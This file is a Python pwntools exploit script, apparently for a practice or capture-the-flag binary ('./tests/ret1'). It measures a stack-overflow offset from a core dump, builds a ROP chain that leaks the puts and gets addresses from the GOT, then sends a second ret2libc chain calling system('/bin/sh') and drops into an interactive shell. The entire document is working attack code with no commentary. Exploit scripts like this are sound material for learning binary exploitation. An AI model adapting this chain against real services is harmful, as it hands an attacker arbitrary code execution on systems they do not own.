from pwn import *
# sudo sysctl -w kernel.core_pattern=core
elf = ELF("./tests/ret1")
rop1 = ROP(elf)

offset_leaking = elf.process()
p = elf.process()

context.arch = 'amd64'

OFFSET = b""
if OFFSET == b"":
	log.info("Searching for offset")
	offset_leaking.sendline(cyclic(516,n=8))
	offset_leaking.wait()
	core = Coredump('./core')
	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
	log.info(f"Offset is {OFFSET}")

p.recv()

rop1.call(elf.symbols["puts"], [elf.got['puts']])
rop1.call(elf.symbols["puts"], [elf.got['gets']])
rop1.call(elf.symbols["main"])

payload1 = [
	b"A"*OFFSET,
	rop1.chain()
]

payload1 = b"".join(payload1)

p.sendline(payload1)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Puts @ {hex(puts)}")
gets = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Gets @ {hex(gets)}")

LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
libc = ELF(LIBC)

rop3 = ROP(libc)
rop3.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop3.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
rop3.call("exit")

payload3 = [
	b"A"*OFFSET,
	rop3.chain()
]

payload3 = b"".join(payload3)

POP_RDI = (rop3.find_gadget(['pop rdi', 'ret']))[0]
BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("POP_RDI @ %s " % hex(POP_RDI))
log.info("/bin/sh @ %s " % hex(BINSH))
log.info("system @ %s " % hex(SYSTEM))
log.info("exit @ %s " % hex(EXIT))

p.sendline(payload3)
p.interactive()
